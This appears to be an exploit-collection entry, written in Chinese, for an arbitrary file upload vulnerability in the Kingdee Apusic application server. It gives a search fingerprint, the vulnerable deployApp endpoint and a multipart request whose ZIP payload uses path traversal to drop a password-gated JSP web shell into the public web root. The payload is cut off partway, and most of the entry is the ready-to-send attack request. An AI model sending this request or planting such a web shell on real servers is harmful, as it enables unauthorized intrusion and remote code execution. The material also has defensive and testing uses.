# 金蝶Apusic应用服务器任意文件上传漏洞

- **系统**：金蝶　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="Apusic应用服务器"`
- **请求**：`POST /admin//protect/application/deployApp HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryd9acIBdV…`

**请求体 / payload**
```
------WebKitFormBoundaryd9acIBdVuqKWDJbd
Content-Disposition: form-data; name="appName"
111
------WebKitFormBoundaryd9acIBdVuqKWDJbd
Content-Disposition: form-data; name="deployInServer"
false
------WebKitFormBoundaryd9acIBdVuqKWDJbd
Content-Disposition: form-data; name="clientFile"; filename="evil.zip"
Content-Type: application/x-zip-compressed
{{unquote("PK\x03\x04\x14\x00\x00\x00\x00\x00\xe5y\x09Uk\x0a\xc8\xe7d\x01\x00\x00d\x01\x00\x007\x00\x00\x00../../../../applications/default/public_html/dudesuite.jsp<%\x0d\x0a    if \x28\"admin\".equals\x28request.getParameter\x28\"pwd\"\x29\x29\x29 \x…（脚本共 1998 字，完整版见原文）
```
- **预期**：200　|　—